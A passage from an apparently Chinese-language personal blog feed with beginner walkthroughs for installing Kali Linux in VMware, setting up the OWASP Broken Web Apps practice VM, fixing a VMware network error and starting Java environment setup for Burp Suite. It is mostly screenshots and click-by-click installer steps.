alt="Augenstern" loading="lazy"><br>按照图里的红框进入到download界面<br><img src="https://img-blog.csdnimg.cn/20200319213003995.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>根据你的配置选择，我的是win10,64位，所以就选第一个。点红框圈住的那个地方（因为可能官网更新，其他博主的教程这里就不是这么点的了）。等待下载<br>下载完成。（可能呢过程有点慢。）<br>打开虚拟机，点击创建新的虚拟机</p><p><img src="https://img-blog.csdnimg.cn/20200319213551808.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>选择自定义，点下一步<br><img src="https://img-blog.csdnimg.cn/20200319213744231.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>然后直接点下一步<br><img src="https://img-blog.csdnimg.cn/20200319213825136.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>点稍后安装操作系统，下一步<br><img src="https://img-blog.csdnimg.cn/20200319213945338.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>操作系统选择Linux，版本默认Ubuntu，点下一步<br><img src="https://img-blog.csdnimg.cn/20200319214048817.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>处理器数量设置为2（当然也可以更大），不能更小，否则不保证不会出错，尽量跟我的设置一样，下一步<img src="https://img-blog.csdnimg.cn/2020031922143682.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br><strong>注意</strong>：内存要4G，不能少。否则会出错，我踩过这个坑。可以通过左边的那个条来快速设置。下一步<br><img src="https://img-blog.csdnimg.cn/20200319221653178.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>选 ：使用网络地址转换，下一步<br><img src="https://img-blog.csdnimg.cn/20200319222110383.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>选择推荐的，，下一步<br><img src="https://img-blog.csdnimg.cn/20200319222229544.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br> 选推荐的那个，下一步<br> <img src="https://img-blog.csdnimg.cn/20200319222503963.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br> 选：创建新虚拟磁盘， 下一步<br> <img src="https://img-blog.csdnimg.cn/20200319222550922.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br> 这里的三个箭头所指的全选上（按照我的来就可以），下一步<br> <img src="https://img-blog.csdnimg.cn/20200319222747762.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br> 通过浏览可以改路径，最好在专属于虚拟机的磁盘里弄一个文件夹。（这个没有那么严格，可以自己随意）<br><img src="https://img-blog.csdnimg.cn/20200319223048482.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br> 这里要注意了，我做的时候没有仔细看教程。<br> 一定要注意，点自定义硬件<br> <img src="https://img-blog.csdnimg.cn/20200319224415230.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br> 按照步骤进行，选择你下载镜像的位置。然后关闭<br> <img src="https://img-blog.csdnimg.cn/20200319224743955.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br> 然后关闭之后点击完成，会开始创建虚拟机<br>创建完成， 对比一下是否有错。<br> <img src="https://img-blog.csdnimg.cn/20200319225031329.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br> 还没完，下一步，开机<img src="https://img-blog.csdnimg.cn/20200319230005700.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br> 选第一个。鼠标点进去虚拟机里敲回车就可以选择<br> 然后是这样的<br> <img src="https://img-blog.csdnimg.cn/20200319230130461.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br> 语言选中文（简体），然后continue<br> <img src="https://img-blog.csdnimg.cn/20200319230308175.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br> 选择中国，继续<br> <img src="https://img-blog.csdnimg.cn/20200319230416287.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br> 配置键盘选择美式英语，继续<br> <img src="https://img-blog.csdnimg.cn/20200319230523880.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br> 出现这个。等待<br> <img src="https://img-blog.csdnimg.cn/20200319230608280.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br> 主机名就kali就行了，继续<br> <img src="https://img-blog.csdnimg.cn/20200319230659301.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br> 域名没有可以不填，直接点继续<br> <img src="https://img-blog.csdnimg.cn/20200319230803558.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br> 新的用户名，自己随意填写， 继续<br> <img src="https://img-blog.csdnimg.cn/20200319230858163.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br> 自行设置密码，继续<img src="https://img-blog.csdnimg.cn/20200319231132602.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br> 使用整个磁盘，继续<br> <img src="https://img-blog.csdnimg.cn/20200319231231667.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br> 选择这个唯一的选项，继续<img src="https://img-blog.csdnimg.cn/20200319231321987.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>选推荐新手使用的，继续<br><img src="https://img-blog.csdnimg.cn/20200319231437593.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>选择<code>结束分区设定并将修改写入磁盘</code>，继续<br><img src="https://img-blog.csdnimg.cn/20200319231511378.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>选择是，继续<br><img src="https://img-blog.csdnimg.cn/20200319231654204.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>出现这个页面，等待<br><img src="https://img-blog.csdnimg.cn/20200319231739565.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>直接点继续<br><img src="https://img-blog.csdnimg.cn/20200319231815252.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>继续等待，<br><img src="https://img-blog.csdnimg.cn/20200319231946961.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>然后一步按照提示操作，那张图我丢了。<br>再继续，就是<img src="https://img-blog.csdnimg.cn/20200319232351123.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>还是等，过一段时间会出现这个，他说可以跳过这一步，别信他的!!听我的，点继续，<br><img src="https://img-blog.csdnimg.cn/20200319232425176.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>然后就会出现那个整个安装步骤的界面，他让跳过这一步，别管其他的，直接点继续，还执行这一步“选择并安装软件”，别跳，千万别跳，我跳了两次，结果呢就是<br>正常完成，但是登陆的时候没有画面，是这样的<br><img src="https://img-blog.csdnimg.cn/2020031923304819.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>这样不是我们想要的结果<br>所以还继续执行那个错了的那一步。相信我，那坑我都踩过了，所以我敢这么说。<br>然后再继续等。出现这样的界面<br><img src="https://img-blog.csdnimg.cn/2020031923332035.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>我也是个小白，什么都不懂，所以我就随便选择了一个，建议跟我选一样的吧，因为其他的我不知，也不能说保证能弄出来，这个我是自己搞过的，可以得到我们想要的结果。点继续<br><img src="https://img-blog.csdnimg.cn/2020031923355117.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>这次下载的东西有点多，建议WiFi下载，因为我连的是手机热点，用了我1.7个G的流量，慎重选择。我挺心疼的。，这个期间需要等待，等待，再等待……<br>然后出现了这个，，，，<br><img src="https://img-blog.csdnimg.cn/20200319233857238.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>不要理他，还是选择继续执行这一步，不要跳，千万别跳。还是这个步骤，接着来，直到搞出来为止（这个不用担心还是重头来的问题，因为你上一步执行这个的时候下载的那些文件，不用重新下载明只是加载一下，而且很快，不会重新下载，也不费流量，也不会费时间。完全可以放心）</p><p><img src="https://img-blog.csdnimg.cn/20200319234001475.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>打一剂定心针，我的到这里了，就要完了的时候，他又给我报错，还让我跳。我就不跳，又来一遍，</p><p><img src="https://img-blog.csdnimg.cn/20200319234117259.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>然后就完了，<img src="https://img-blog.csdnimg.cn/20200319234611837.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>这里就会快多了，<br>等待过程再放一张过程图，胜利就在前方。坚持啊！<br><img src="https://img-blog.csdnimg.cn/20200319234716801.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>OK了，终于到这一步了，选择是，点击继续<br><img src="https://img-blog.csdnimg.cn/20200319234750153.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>选择/dev/sda.    ，，，点击继续</p><p><img src="https://img-blog.csdnimg.cn/20200319234837950.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>到结束这一步了，加载很快的，坚持……<br><img src="https://img-blog.csdnimg.cn/20200319234954717.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>结束安装进程，到这里已经成功了，来看看是什么亚子吧，哈哈哈。先把兴奋留着，到后面再说<br><img src="https://img-blog.csdnimg.cn/20200319235113398.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>输入你自己在安装过程中的用户名和密码。就可以登陆了<br><img src="https://img-blog.csdnimg.cn/2020031923530482.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>进来了看看什么样子<br><img src="https://img-blog.csdnimg.cn/20200319235429736.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>哇，太奈斯了，这个时候就可以长呼一口气了。为自己鼓掌。<br>现在我说一下我搭建时的艰辛，我上午下课十二点，吃个午饭，整了一下午，然后吃了晚饭又赶紧过来接着搞，到现在我这边博客写到这儿，晚上十二点了。中间几乎没停。所以在搭建过程中，不要觉得等的时间太长而放弃，坚持就是胜利。现在的最新版本的kali教程跟以前的不一样了。安装教程也很让人头疼，特别是我这样的初学者。分享这个为了让跟我一样的小白少踩一些坑。OK，其他的明天再说。先睡了！</p><p>OWASP靶机搭建<br>这个还是挺简单的，没有太繁琐的操作。开始吧<br>第一步：下载虚拟机，仍然是官网下载<a href="https://sourceforge.net/projects/owaspbwa/files/1.0rc2/">OWASP靶机官网</a><br><img src="https://img-blog.csdnimg.cn/2020032008114328.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>点击download，然后就会跳转自动下载一个压缩包了。这个靶机没有什么旧版本新版本的，靶机嘛，就是一堆漏洞，没必要更新。<br>下载完成后，解压到虚拟机的专属位置（分下类，有规律一点）。<br>打开虚拟机主页，点击打开虚拟机<br><img src="https://img-blog.csdnimg.cn/20200320081644132.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>然后根据你解压的靶机的路径把虚拟机添加进来，<br><img src="https://img-blog.csdnimg.cn/2020032008204049.png" alt="Augenstern" loading="lazy"><br>点开解压的文件夹就会有这个点击打开就行。<br>打开之后就直接是个虚拟机，是这样<br><img src="https://img-blog.csdnimg.cn/20200320082305443.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>描述里面用户名和密码，打开虚拟机就行了。<br>输入用户名密码就进入了<br><img src="https://img-blog.csdnimg.cn/20200320082610872.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>看，已经进去了，这个密码输入的时候是看不到任何东西，我开始也可迷惑，为什么？难道是我的键盘不管用了？然后就找百度，原因也特别简单，就是，你输入密码就是看不到，只要别打错密码，把密码一股脑连续输进去，点击回车。看下图</p><p><img src="https://img-blog.csdnimg.cn/20200320082814463.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>会提示我们welcome。这个就是成功进入了。<br>然后就输入<code>dhclient eth0</code>重新获取虚拟机IP。<br><img src="https://img-blog.csdnimg.cn/20200320083544592.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>把IP作为域名放到浏览器访问，就会出现下面的页面。<br><img src="https://img-blog.csdnimg.cn/20200320083703219.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>我是用谷歌访问的，因为我看英文比较吃力，还能翻译一下。<br>到这里靶机搭建就成功了，可以进行一些常规的操作，请自行百度。</p><h4 id="VMware出现的一些问题，"><a href="#VMware出现的一些问题，" class="headerlink" title="VMware出现的一些问题，"></a>VMware出现的一些问题，</h4><p>刚打开虚拟机准备搭建的时候，发现有点不对劲，就是我原本的是中文版的，变成了全英文的，刚开始我也没太在意，就直接搭建了。然后失败了，就在打开虚拟机那一步，发现虚拟机打不开。它提示<code>Unable to find brain******一堆我忘了是什么了</code>。我忘了留图了，就在百度上找了一张，<br><img src="https://img-blog.csdnimg.cn/20200320100519863.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="来自百度" loading="lazy"><br>就查百度，有说让重装的，那我之前的win7怎么办，不敢重装，就接着找方法，功夫不负有心人。我在百度经验上找到一位不知名的大佬看到了他的回复。我跟着操作，就可以了。也没有重装。<br><img src="https://img-blog.csdnimg.cn/20200320095838875.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>下面说一下操作。<br>1.关闭虚拟机程序就不多说了，按照操作来就行。<br>2.以管理员身份运行命令行，可以在搜索cmd在下面搜索框</p><p><img src="https://img-blog.csdnimg.cn/20200320100700402.png" alt="Augenstern" loading="lazy"><br>然后有这样的<br><img src="https://img-blog.csdnimg.cn/20200320100820789.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>然后操作就行了。<br>3.第三步就不演示了，就有一点要注意，就是快要修复完的时候它会找一个文件。名字叫<code>vmnetBridge.dll</code>这个如果找不到在哪里，可以用everything找一下，很快的。<br>呼……终于完了，到这里，全部问题解决。非常开心，哈哈哈！！！！<br><img src="https://img-blog.csdnimg.cn/20200320101931970.gif" alt="Augenstern" loading="lazy"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 工具人 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java环境配置、burpsuite的配置、下载御剑</title>
      <link href="/posts/d6ff727f/"/>
      <url>/posts/d6ff727f/</url>
      
        <content type="html"><![CDATA[<p>害，这次get到的东西还挺多，全放到这一篇文章中来啦！！开动，奥利给！！！</p><h1 id="Java环境配置"><a href="#Java环境配置" class="headerlink" title="Java环境配置"></a>Java环境配置</h1><p>首先在官网下载jdk<a href="https://www.oracle.com/java/technologies/javase/javase-jdk8-downloads.html">https://www.oracle.com/java/technologies/javase/javase-jdk8-downloads.html</a><img src="https://img-blog.csdnimg.cn/20200215211106643.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>可以自己选择，现在已经更新到java13了好像，害，说起来又是心酸，我起初下载的就是最新版本的迫于无奈又换了。妈呀，跑题了，，哈哈哈。继续<br>百度网盘：链接：<a href="https://pan.baidu.com/s/1BDdfQrntfgoFlE7wCktWsg">https://pan.baidu.com/s/1BDdfQrntfgoFlE7wCktWsg</a> 提取码：kutq<br>下载好了就双击安装就🆗<br><img src="https://img-blog.csdnimg.cn/20200215213156948.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>关于配置环境建议放在C盘里吧，当然如果C盘东西太多也是可以调一下位置的，emmmmmm,就是有点麻烦。下一步，<img src="https://img-blog.csdnimg.cn/20200215213531730.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>这个默认的就行，（上一步更改位置的这一步要改成跟上面一样的。）等待安装……<br><img src="https://img-blog.csdnimg.cn/20200215213728984.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>安装好后出现<br><img src="https://img-blog.csdnimg.cn/20200215213816181.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>点击关闭，然后开始配置环境变量<br>1.右键单击此电脑，点击属性<br>2.点击高级系统设置，找到环境变量，新建<br><img src="https://img-blog.csdnimg.cn/20200215214641512.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>3.新建一个变量名：JAVA_HOME<br>变量值：C:\Program Files\Java\jdk1.8.0_181<br><img src="https://img-blog.csdnimg.cn/20200215215359633.png" alt="在这里插入图片描述" loading="lazy"><br>4.同样的<br>变量名 <code>.;%JAVA_HOME\lib\dt.jar;%JAVA_HOME%\lib\tools.jar</code><strong>全英文输入</strong><br><img src="https://img-blog.csdnimg.cn/20200215215442964.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>5.找到Path变量<br><img src="https://img-blog.csdnimg.cn/20200215215636359.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>6.编辑Path变量新建下图所示环境<br><img src="https://img-blog.csdnimg.cn/20200215215747929.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" 